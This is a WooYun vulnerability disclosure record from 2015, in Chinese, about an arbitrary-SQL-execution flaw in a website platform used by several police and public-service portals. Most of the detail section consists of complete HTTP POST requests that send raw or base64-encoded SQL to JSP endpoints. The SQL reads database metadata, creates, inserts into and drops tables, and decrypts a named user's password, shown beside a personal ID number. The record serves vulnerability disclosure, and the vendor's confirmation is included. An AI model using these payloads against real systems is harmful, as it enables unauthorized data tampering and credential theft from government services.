{"id": 80515, "wybug_id": "wooyun-2015-0155743", "wybug_title": "某敏感部门建站系统存在通用型设计缺陷漏洞（增删改查）", "wybug_corp": "福建天创信息科技有限公司", "wybug_author": "路人甲", "wybug_date": "2015-11-25 13:44", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-30：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 通用型设计缺陷狗狗侠哥我给你跪了，增删改献上 详细说明：  厂商：福建天创信息科技有限公司http://**.**.**.**/系统有的叫网上警局，有的叫公安便民网关键字：\n技术支持:福建天创信息科技有限公司\n以官网为例\nPOST http://**.**.**.**/public/getclientset_evalstr.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://**.**.**.**Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: **.**.**.**Content-Length: 79Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=0000AREvZz6rXhzos056AihiOlx:182f4gpp8qryObj=qry_judge&sql=select+*+from+v%24version&datasource=tchdb&sendType=myhttp\n\n\n所有表，你懂的\n\n在此演示一下增删改增表\nPOST http://**.**.**.**/public/getclientset_evalstr.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://**.**.**.**Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: **.**.**.**Content-Length: 97Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=0000AREvZz6rXhzos056AihiOlx:182f4gpp8qryObj=qry_judge&sql=create+table+wooyun(id+number(11)+not+null)&datasource=tchdb&sendType=myhttp\n我新增了一个叫wooyun的表，查询所有表时，你能够发现这张表存在，0行\n\n我要往wooyun这张表插入数据\nPOST http://**.**.**.**/public/getclientset_evalstr.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://**.**.**.**Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: **.**.**.**Content-Length: 86Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=0000AREvZz6rXhzos056AihiOlx:182f4gpp8qryObj=qry_judge&sql=insert+into+wooyun(id)+values(1)&datasource=tchdb&sendType=myhttp\n我往wooyun这张表插入了一条数据，id列为1的select wooyun\n\n你会发现1存在最后我们删除wooyun表\n\n最后select全表看看wooyun在不在\n\n你看表删了其它案例（就不在演示增删改了）：钦州公安便民网http://**.**.**.**\nPOST http://**.**.**.**/public/getclientset_evalstr.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://**.**.**.**Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: **.**.**.**Content-Length: 72Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=0000miumpwM423HvUeQEH9C79bJ:18u5r5o55qryObj=qry_judge&sql=select+*+from+tabs&datasource=tchdb&sendType=myhttp\n\n\n\n\n福建省流动人口综合信息服务管理平台http://**.**.**.**\nPOST http://**.**.**.**/szpt/public/getclientset_evalstr.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://**.**.**.**/szpt/ygdw/dwjbxxdjb_edit.jsp#Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: **.**.**.**Content-Length: 79Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=0000AREvZz6rXhzos056AihiOlx:182f4gpp8qryObj=qry_judge&sql=select+*+from+v%24version&datasource=tchdb&sendType=myhttp\n\n\n   漏洞证明：  下面这几个版本略有不同，不同之处在于把sql传的参数base64加密了，请问有什么区别许昌公安网上警局http://**.**.**.**\nPOST http://**.**.**.**/public/getclientset_evalstr.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://**.**.**.**Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: **.**.**.**Content-Length: 83Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=0000CsMjh0hHnW0P74o02GtE095:18a9khjah; CNZZDATA1253313151=1614302783-1448417605-%7C1448417605qryObj=this&datasource=tchdb&sql=c2VsZWN0ICogZnJvbSB2JHZlcnNpb24%3D&sendType=myhttp\n\n\n\n\n三明网上警局http://**.**.**.**:30001/\nPOST http://**.**.**.**:30001/public/getclientset_evalstr.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://**.**.**.**:30001Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: **.**.**.**:30001Content-Length: 73Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=0000CsMjh0hHnW0P74o02GtE095:18a9khjah; CNZZDATA1253313151=1614302783-1448417605-%7C1448417605qryObj=this&datasource=tchdb&sql=c2VsZWN0ICogZnJvbSB0YWJz&sendType=myhttp\n\n\n鄂州市公众服务网-网上警局**.**.**.**/\nPOST http://**.**.**.**/public/getclientset_evalstr.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://**.**.**.**Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: **.**.**.**Content-Length: 72Connection: Keep-AlivePragma: no-cacheCookie: JSESSIONID=0000CsMjh0hHnW0P74o02GtE095:18a9khjah; CNZZDATA1253313151=1614302783-1448417605-%7C1448417605qryObj=this&datasource=tchdb&sql=select * from v$version&sendType=myhttp\n\n\n这类型错误最可怕的就是可以直接update与delete以上我仅指出了public/getclientset_evalstr.jsp这个页面实际上在系统内public/getclientset_cutrowsetnowin.jsp\nPOST http://**.**.**.**/public/getclientset_cutrowsetnowin.jsp HTTP/1.1Accept: */*Accept-Language: zh-cnReferer: http://**.**.**.**/csso/write_gtg.jsp?SSOTGT=nO97^1448056406951^350783198801110214^6b8a08d0Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Host: **.**.**.**Content-Length: 212Connection: Keep-AlivePragma: no-cacheqryObj=this&datasource=tchdb&sql=select%20tc_webjj.fun_uncrypkey%28spwd%29%20as%20spwd%20%20from%20tc_webjj.t_commoner%20where%20pid%20%3D%20%27350783198801110214%27%20and%20sstate%20%3D%20%271%27&sendType=myhttp\n也是存在问题的，也许有更多的页面，但传递的参数基本一致，赶紧补丁吧   修复方案：  补丁   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-11-27 17:57 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向软件生产厂商通报，涉及案例转由CNCERT发对应分中心处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}